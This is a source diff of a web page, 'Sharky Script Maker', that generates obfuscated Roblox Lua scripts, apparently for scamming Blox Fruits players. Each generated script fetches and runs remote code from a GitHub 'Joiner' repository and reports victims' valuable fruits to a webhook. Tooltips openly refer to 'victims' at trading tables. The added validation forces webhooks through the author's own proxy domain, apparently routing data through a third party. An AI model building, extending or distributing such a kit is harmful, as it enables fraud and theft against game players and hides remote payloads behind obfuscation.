@@ -1,17 +1,15 @@
 'use client';
 
-import {useState, useEffect, useRef} from 'react';
+import {useState, useEffect, useRef, useTransition} from 'react';
 import {Button} from '@/components/ui/button';
 import {Textarea} from '@/components/ui/textarea';
 import {Checkbox} from '@/components/ui/checkbox';
 import {Label} from '@/components/ui/label';
 import {Input} from '@/components/ui/input';
 import {Download, Copy, HelpCircle} from 'lucide-react';
-import {useToast} from '@/hooks/use-toast';
+import {useToast} from '@/hooks/use-toast'; // Assuming this is your custom hook path
 
-import {useTransition} from 'react';
 import {obfuscateScript} from '@/ai/flows/obfuscate-script';
-
 import ParticleComponent from '@/components/ParticleComponent';
 
 import {
@@ -20,39 +18,35 @@ import {
   TooltipProvider,
   TooltipTrigger,
 } from "@/components/ui/tooltip"
-import {useIsMobile} from "@/hooks/use-mobile";
+import {useIsMobile} from "@/hooks/use-mobile"; // Assuming this is your custom hook path
 
-
+// --- Constants for Fruits ---
 const mythicalFruits = [
-  'Kitsune-Kitsune',
-  'Yeti-Yeti',
-  'Gas-Gas',
-  'Leopard-Leopard',
-  'Control-Control',
-  'Dough-Dough',
-  'T-Rex-T-Rex',
-  'Spirit-Spirit',
-  'Mammoth-Mammoth',
-  'Venom-Venom',
+  'Kitsune-Kitsune', 'Yeti-Yeti', 'Gas-Gas', 'Leopard-Leopard', 'Control-Control',
+  'Dough-Dough', 'T-Rex-T-Rex', 'Spirit-Spirit', 'Mammoth-Mammoth', 'Venom-Venom',
 ];
 const legendaryFruits = [
-  'Portal-Portal',
-  'Buddha-Buddha',
-  'Rumble-Rumble',
-  'Shadow-Shadow',
-  'Blizzard-Blizzard',
-  'Sound-Sound',
-  'Phoenix-Phoenix',
-  'Pain-Pain',
-  'Gravity-Gravity',
-  'Love-Love',
-  'Spider-Spider',
-  'Quake-Quake',
+  'Portal-Portal', 'Buddha-Buddha', 'Rumble-Rumble', 'Shadow-Shadow', 'Blizzard-Blizzard',
+  'Sound-Sound', 'Phoenix-Phoenix', 'Pain-Pain', 'Gravity-Gravity', 'Love-Love',
+  'Spider-Spider', 'Quake-Quake',
 ];
 const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
 const defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];
 
+// --- Define the expected URL prefix ---
+const PROTECTED_WEBHOOK_PREFIX = 'https://sharky-on-top.script-config-protector.workers.dev/w/';
+const PROTECTOR_URL = 'https://sharkyontop.pages.dev/'; // Define protector URL constant
+
+
+// --- Type for error state to optionally include a link flag ---
+type WebhookErrorState = {
+    message: string;
+    showLink?: boolean;
+} | null;
+
+
 export default function Home() {
+  // --- State Variables ---
   const [webhookUrl, setWebhookUrl] = useState('');
   const [usernames, setUsernames] = useState('');
   const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
@@ -61,44 +55,96 @@ export default function Home() {
   const [pastefyLink, setPastefyLink] = useState('');
   const {toast} = useToast();
   const [isPending, startTransition] = useTransition();
-    const isMobile = useIsMobile();
-    const [tooltipStates, setTooltipStates] = useState({
-        webhookUrl: false,
-        usernames: false,
-        fruitsToHit: false,
-    });
+  const isMobile = useIsMobile();
+  const [tooltipStates, setTooltipStates] = useState({
+      webhookUrl: false,
+      usernames: false,
+      fruitsToHit: false,
+  });
+  // --- Updated state for webhook validation error ---
+  const [webhookError, setWebhookError] = useState<WebhookErrorState>(null); // Use the new type
 
-    const toggleTooltip = (field: string) => {
-        if (isMobile) {
-            setTooltipStates(prevState => ({
-                ...Object.fromEntries(
-                    Object.keys(prevState).map(key => [key, false])
-                ),
-                [field]: !prevState[field],
-            }));
-        }
-    };
+  // --- Tooltip Logic ---
+  const toggleTooltip = (field: keyof typeof tooltipStates) => {
+      if (isMobile) {
+          setTooltipStates(prevState => ({
+              ...Object.fromEntries(
+                  Object.keys(prevState).map(key => [key, false])
+              ),
+              [field]: !prevState[field],
+          }));
+      }
+  };
 
   const isGenerating = isPending;
 
+  // --- Generate Script Logic ---
   const generateScript = async () => {
+    // --- Clear previous errors/outputs ---
+    setWebhookError(null); // Clear error state
+    setConfiguredScript('');
+    setObfuscatedScript('');
+    setPastefyLink('');
+
+    // --- Validate Webhook URL ---
+    if (!webhookUrl) {
+        setWebhookError({ message: 'Protected WebhookURL is required.'}); // Set error object
+        toast({ title: 'Error', description: 'Protected WebhookURL is required.', variant: 'destructive' });
+        return;
+    }
+    // --- ** NEW: Updated Validation Error Message ** ---
+    if (!webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX)) {
+        // Set error object including the flag to show the link
+        setWebhookError({
+            message: 'Protected Webhook Required. Protect your discord webhook here:',
+            showLink: true
+        });
+        toast({ title: 'Error', description: `Invalid Webhook URL format.`, variant: 'destructive' });
+        return;
+    }
+    // --- End Validation ---
+
+    // Basic input checks
+    if (!usernames.trim()) {
+        toast({ title: 'Error', description: 'Usernames cannot be empty.', variant: 'destructive' });
+        return;
+    }
+     if (selectedFruits.length === 0) {
+        toast({ title: 'Error', description: 'Please select at least one fruit.', variant: 'destructive' });
+        return;
+    }
+
+    // --- Construct Script (only if validation passes) ---
+    // (Rest of the script construction and obfuscation logic remains the same...)
     try {
-      let script = `Webhook = "${webhookUrl}" -- << Discord Webhook Here\n`;
-      script += `Usernames = {${usernames
+      const formattedUsernames = usernames
         .split('\n')
+        .map(user => user.trim())
+        .filter(user => user.length > 0)
         .map(user => `"${user}"`)
-        .join(', ')}} -- << Your usernames here, you can add as many alts as you want\n`;
-      script += `FruitsToHit = {${selectedFruits.map(fruit => `"${fruit}"`).join(', ')}} -- << Fruits you want the script to detect\n`;
+        .join(', ');
+
+      const formattedFruits = selectedFruits
+        .map(fruit => `"${fruit}"`)
+        .join(', ');
+
+      if (!formattedUsernames) {
+          toast({ title: 'Error', description: 'Valid usernames are required.', variant: 'destructive' });
+          return;
+      }
+
+      let script = `Webhook = "${webhookUrl}" -- << Protected Webhook Here\n`;
+      script += `Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want\n`;
+      script += `FruitsToHit = {${formattedFruits}} -- << Fruits you want the script to detect\n`;
       script += `loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
 
       setConfiguredScript(script);
-      // Obfuscate the script using the Genkit flow
+
       startTransition(async () => {
         try {
           const obfuscationResult = await obfuscateScript({script: script});
           setObfuscatedScript(obfuscationResult.obfuscatedScript);
           setPastefyLink(obfuscationResult.pastefyLink);
-
           toast({
             title: 'Script Generated!',
             description: 'Script generated and obfuscated successfully.',
@@ -110,17 +156,21 @@ export default function Home() {
             description: `Failed to generate script: ${error.message}`,
             variant: 'destructive',
           });
+          setObfuscatedScript('');
+          setPastefyLink('');
         }
       });
     } catch (error: any) {
-      toast({
+       console.error("Error constructing script:", error);
+       toast({
         title: 'Error',
-        description: `Failed to generate script: ${error.message}`,
+        description: `Failed to construct script: ${error.message}`,
         variant: 'destructive',
       });
     }
   };
 
+  // --- Fruit Selection Logic (remains the same) ---
   const handleFruitSelect = (fruit: string) => {
     setSelectedFruits(prev => {
       if (prev.includes(fruit)) {
@@ -131,19 +181,14 @@ export default function Home() {
     });
   };
 
+  // --- Download Logic (remains the same) ---
   const downloadScript = () => {
     if (!obfuscatedScript) {
-      toast({
-        title: 'Error',
-        description: 'Please generate a script first.',
-        variant: 'destructive',
-      });
+      toast({ title: 'Error', description: 'Please generate a script first.', variant: 'destructive' });
       return;
     }
-
     const blob = new Blob([obfuscatedScript], {type: 'text/plain'});
     const url = URL.createObjectURL(blob);
-
     const a = document.createElement('a');
     a.href = url;
     a.download = 'roblox_script.lua';
@@ -153,109 +198,106 @@ export default function Home() {
     URL.revokeObjectURL(url);
   };
 
-  const copyConfiguredScript = async () => {
-    if (configuredScript) {
-      await navigator.clipboard.writeText(configuredScript);
-      toast({
-        title: 'Copied!',
-        description: 'Configured script copied to clipboard.',
-      });
-    } else {
-      toast({
-        title: 'Error',
-        description: 'No configured script to copy.',
-        variant: 'destructive',
-      });
-    }
+  // --- Copy Logic (remains the same) ---
+  const copyToClipboard = async (textToCopy: string, successMessage: string) => {
+     if (!textToCopy) {
+       toast({ title: 'Error', description: 'Nothing to copy.', variant: 'destructive' });
+       return;
+     }
+     try {
+        await navigator.clipboard.writeText(textToCopy);
+        toast({ title: 'Copied!', description: successMessage });
+     } catch (err) {
+        console.error('Failed to copy text: ', err);
+        toast({ variant: "destructive", title: "Copy Failed", description: "Could not copy script." });
+     }
   };
 
-  const copyObfuscatedScript = async () => {
-    if (obfuscatedScript) {
-      await navigator.clipboard.writeText(obfuscatedScript);
-      toast({
-        title: 'Copied!',
-        description: 'Obfuscated script copied to clipboard.',
-      });
-    } else {
-      toast({
-        title: 'Error',
-        description: 'No obfuscated script to copy.',
-        variant: 'destructive',
-      });
-    }
-  };
-
+  // --- JSX Return ---
   return (
     <>
       <ParticleComponent />
       <div className="flex flex-col items-center justify-center min-h-screen p-4 neon-text">
-        {' '}
-        {/* Added neon-text class here */}
-        <div className="container mx-auto max-w-3xl w-full">
-          <h1 className="text-2xl font-bold mb-4 text-center">Sharky Script Maker</h1>
+        <div className="container mx-auto max-w-3xl w-full bg-gray-800 bg-opacity-80 p-8 rounded-lg border border-cyan-500/30 shadow-lg shadow-cyan-500/20 z-10">
+          <h1 className="text-3xl font-bold mb-8 text-center text-cyan-400 font-orbitron">Sharky Script Maker</h1>
           <div className="mb-4">
-            <div className="flex items-center space-x-2">
-                <Label htmlFor="webhookUrl">Discord Webhook URL</Label>
+             {/* === Webhook Input Section === */}
+             <div className="flex items-center space-x-2 mb-2">
+                {/* Updated Label */}
+                <Label htmlFor="webhookUrl" className="text-cyan-400 font-bold">Protected WebhookURL</Label>
                 <TooltipProvider>
                   <Tooltip
                     open={tooltipStates.webhookUrl}
                     onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, webhookUrl: open })}
                   >
                     <TooltipTrigger asChild>
-                      <Button
-                        variant="ghost"
-                        size="icon"
-                        onClick={() => {
-                          if (isMobile) {
-                            toggleTooltip('webhookUrl');
-                          }
-                        }}
-                      >
+                      <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('webhookUrl'); } }}>
                         <HelpCircle className="h-4 w-4" />
                       </Button>
                     </TooltipTrigger>
-                    <TooltipContent className="tooltip-content" style={{ width: '350px' }}>
-                      <ul>
-                        <li>Enter your <b>Discord Webhook URL</b> to receive notifications when the script detects a fruit.</li>
-                        <li>The webhook URL should be a valid Discord webhook URL.</li>
-                        <li>This allows the script to send messages to your Discord channel.</li>
-                      </ul>
+                    {/* === Updated Tooltip Content === */}
+                    <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
+                        <p className="mb-2">Enter your <b>Protected Webhook URL</b> to receive notifications when the script detects a fruit.</p>
+                        <p className="mb-2">First make a Discord Webhook, and then protect it here --&gt;{' '}
+                            <a href={PROTECTOR_URL} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
+                                {PROTECTOR_URL}
+                            </a>.
+                        </p>
+                        <p>This allows the script to send messages to your Discord channel.</p>
                     </TooltipContent>
+                     {/* === End Updated Tooltip Content === */}
                   </Tooltip>
                 </TooltipProvider>
               </div>
-            <Input
-              type="text"
-              id="webhookUrl"
-              value={webhookUrl}
-              onChange={e => setWebhookUrl(e.target.value)}
-              placeholder="Enter your Discord Webhook URL"
-              className="w-full"
-            />
+              <Input
+                type="text"
+                id="webhookUrl"
+                value={webhookUrl}
+                onChange={e => {
+                    setWebhookUrl(e.target.value);
+                    // Clear error on change
+                    if (webhookError) setWebhookError(null); // Clear error object
+                }}
+                placeholder="Enter your protected webhook URL"
+                className={`w-full p-3 bg-gray-900 border rounded-md text-gray-200 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent ${webhookError ? 'border-red-500' : 'border-cyan-500/50'}`} // Use webhookError state
+              />
+              {/* === Updated Error Display === */}
+              {webhookError && (
+                <div className="mt-1">
+                  <p className="text-sm text-red-400">{webhookError.message}</p>
+                  {/* Conditionally show the link */}
+                  {webhookError.showLink && (
+                    <a
+                      href={PROTECTOR_URL}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="text-sm text-blue-400 hover:underline"
+                    >
+                      {PROTECTOR_URL}
+                    </a>
+                  )}
+                </div>
+              )}
+               {/* === End Updated Error Display === */}
           </div>
+
+          {/* Usernames Section (remains the same) */}
           <div className="mb-4">
-              <div className="flex items-center space-x-2">
-                <Label htmlFor="usernames">Usernames (one per line)</Label>
+              <div className="flex items-center space-x-2 mb-2">
+                <Label htmlFor="usernames" className="text-cyan-400 font-bold">Usernames (one per line)</Label>
                   <TooltipProvider>
-                    <Tooltip
+                    {/* ... tooltip content ... */}
+                     <Tooltip
                       open={tooltipStates.usernames}
                       onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, usernames: open })}
                     >
                       <TooltipTrigger asChild>
-                        <Button
-                          variant="ghost"
-                          size="icon"
-                          onClick={() => {
-                            if (isMobile) {
-                              toggleTooltip('usernames');
-                            }
-                          }}
-                        >
+                        <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('usernames'); } }}>
                           <HelpCircle className="h-4 w-4" />
                         </Button>
                       </TooltipTrigger>
-                      <TooltipContent className="tooltip-content" style={{ width: '350px' }}>
-                         <ul>
+                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md" style={{ width: '350px' }}>
+                          <ul>
                             <li>Enter usernames of <b>YOUR</b> accounts.</li>
                             <li>These will be the accounts that can use the script's commands.</li>
                             <li>They will also be the ones sitting in trading tables with victims.</li>
@@ -265,130 +307,130 @@ export default function Home() {
                     </Tooltip>
                   </TooltipProvider>
               </div>
-            <Textarea
-              id="usernames"
-              value={usernames}
-              onChange={e => setUsernames(e.target.value)}
-              placeholder="Enter usernames, one per line"
-              className="w-full"
-              style={{fontFamily: 'Roboto Mono, monospace'}} // Added monospaced font
-            />
+              <Textarea
+                id="usernames"
+                value={usernames}
+                onChange={e => setUsernames(e.target.value)}
+                placeholder="Enter usernames, one per line"
+                className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-200 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent"
+                style={{fontFamily: 'Roboto Mono, monospace'}}
+              />
           </div>
+
+          {/* Fruits Section (remains the same) */}
           <div className="mb-4">
-              <div className="flex items-center space-x-2">
-                <Label>Fruits to Hit</Label>
+              <div className="flex items-center space-x-2 mb-2">
+                <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
                  <TooltipProvider>
-                   <Tooltip
-                     open={tooltipStates.fruitsToHit}
-                     onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
-                   >
-                     <TooltipTrigger asChild>
-                       <Button
-                         variant="ghost"
-                         size="icon"
-                         onClick={() => {
-                           if (isMobile) {
-                             toggleTooltip('fruitsToHit');
-                           }
-                         }}
-                       >
-                         <HelpCircle className="h-4 w-4" />
-                       </Button>
-                     </TooltipTrigger>
-                     <TooltipContent className="tooltip-content" style={{ width: '350px' }}>
-                        <ul>
-                          <li>Select the fruits you want the script to detect.</li>
-                          <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
-                        </ul>
-                     </TooltipContent>
-                   </Tooltip>
-                 </TooltipProvider>
+                    {/* ... tooltip content ... */}
+                     <Tooltip
+                      open={tooltipStates.fruitsToHit}
+                      onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
+                    >
+                      <TooltipTrigger asChild>
+                        <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('fruitsToHit'); } }}>
+                          <HelpCircle className="h-4 w-4" />
+                        </Button>
+                      </TooltipTrigger>
+                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md" style={{ width: '350px' }}>
+                          <ul>
+                            <li>Select the fruits you want the script to detect.</li>
+                            <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
+                          </ul>
+                      </TooltipContent>
+                    </Tooltip>
+                  </TooltipProvider>
               </div>
-            <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-              {sortedFruitsByRarity.map(fruit => (
-                <div key={fruit} className="flex items-center space-x-2">
-                 <label
-                    htmlFor={fruit}
-                    className="flex items-center space-x-2 cursor-pointer"
-                  >
-                    <Checkbox
+              <div className="grid grid-cols-2 md:grid-cols-4 gap-2 p-3 bg-gray-900 border border-cyan-500/50 rounded-md">
+                {sortedFruitsByRarity.map(fruit => (
+                  <div key={fruit} className="flex items-center space-x-2">
+                   <Checkbox
                       id={fruit}
                       checked={selectedFruits.includes(fruit)}
                       onCheckedChange={() => handleFruitSelect(fruit)}
+                      className="border-cyan-500/50 data-[state=checked]:bg-cyan-500 data-[state=checked]:text-gray-900"
                     />
-                    <span>{fruit}</span>
-                  </label>
-                </div>
-              ))}
-            </div>
+                    <label
+                      htmlFor={fruit}
+                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer"
+                    >
+                      {fruit}
+                    </label>
+                  </div>
+                ))}
+              </div>
           </div>
+
+          {/* Generate Button (remains the same) */}
           <div className="mb-4">
-            <Button onClick={generateScript} className="generate-button" disabled={isGenerating}>
+            <Button onClick={generateScript} className="w-full mt-4 p-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-gray-900 font-bold rounded-md hover:from-cyan-400 hover:to-purple-500 transition duration-300 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed" disabled={isGenerating}>
               {isGenerating ? 'Generating...' : 'Generate Script'}
             </Button>
           </div>
+
+          {/* Configured Script Output (remains the same) */}
           {configuredScript && (
             <div className="mb-4">
-              <Label>Configured Script</Label>
-              <div className="relative">
-                <Textarea
-                  value={configuredScript}
-                  readOnly
-                  className="w-full"
-                  style={{
-                    fontFamily: 'Roboto Mono, monospace',
-                    opacity: 0.7,
-                  }}
-                />
-                <Button
-                  onClick={copyConfiguredScript}
-                  className="absolute right-2 top-2 bg-secondary text-secondary-foreground hover:bg-secondary/80 rounded-md shadow-md"
-                  size="icon">
-                  <Copy className="h-4 w-4" />
-                </Button>
+              <div className="flex justify-between items-center mb-2">
+                 <Label className="text-green-400 font-bold">Configured Script</Label>
+                 <Button
+                    onClick={() => copyToClipboard(configuredScript, 'Configured script copied.')}
+                    variant="outline" size="sm"
+                    className="bg-gray-600 hover:bg-gray-500 text-gray-200 border-gray-500 px-2 py-1"
+                    >
+                    <Copy className="h-3 w-3 mr-1" /> Copy
+                 </Button>
               </div>
+              <Textarea
+                value={configuredScript} readOnly
+                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-300 opacity-80"
+                rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
+              />
             </div>
           )}
+
+          {/* Obfuscated Script Output (remains the same) */}
           {obfuscatedScript && (
             <div className="mb-4">
-              <Label>Obfuscated Script</Label>
+               <div className="flex justify-between items-center mb-2">
+                 <Label className="text-green-400 font-bold">Obfuscated Script</Label>
+                 <Button
+                    onClick={() => copyToClipboard(obfuscatedScript, 'Obfuscated script copied.')}
+                    variant="outline" size="sm"
+                    className="bg-green-600 hover:bg-green-500 text-gray-900 border-green-700 px-2 py-1"
+                    >
+                    <Copy className="h-3 w-3 mr-1" /> Copy
+                 </Button>
+              </div>
               {pastefyLink && (
-                <div className="mb-2">
-                  <Label>Pastefy Link:</Label>
-                  <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-accent underline">
+                <div className="mb-2 text-sm">
+                  <span className="text-gray-400">Pastefy Link: </span>
+                  <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-cyan-400 hover:underline break-all">
                     {pastefyLink}
                   </a>
                 </div>
               )}
-              <div className="relative">
-                <Textarea
-                  value={obfuscatedScript}
-                  readOnly
-                  className="w-full"
-                  style={{
-                    fontFamily: 'Roboto Mono, monospace',
-                    opacity: 0.7,
-                  }}
-                />
-                <Button
-                  onClick={copyObfuscatedScript}
-                  className="absolute right-2 top-2 bg-secondary text-secondary-foreground hover:bg-secondary/80 rounded-md shadow-md"
-                  size="icon">
-                  <Copy className="h-4 w-4" />
-                </Button>
-              </div>
+              <Textarea
+                value={obfuscatedScript} readOnly
+                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-300 opacity-80"
+                rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
+              />
             </div>
           )}
-          <Button
-            onClick={downloadScript}
-            className="download-button"
-            disabled={!obfuscatedScript}>
-            <Download className="mr-2 h-4 w-4" />
-            Download Script
-          </Button>
+
+          {/* Download Button (remains the same) */}
+           <Button
+              onClick={downloadScript}
+              className="w-full mt-4 p-4 border border-cyan-500/50 text-cyan-400 bg-gray-800 hover:bg-gray-700 rounded-md disabled:opacity-50 disabled:cursor-not-allowed"
+              disabled={!obfuscatedScript || isGenerating}
+              variant="outline"
+            >
+              <Download className="mr-2 h-4 w-4" />
+              Download Script
+            </Button>
+
         </div>
       </div>
     </>
   );
 }
-
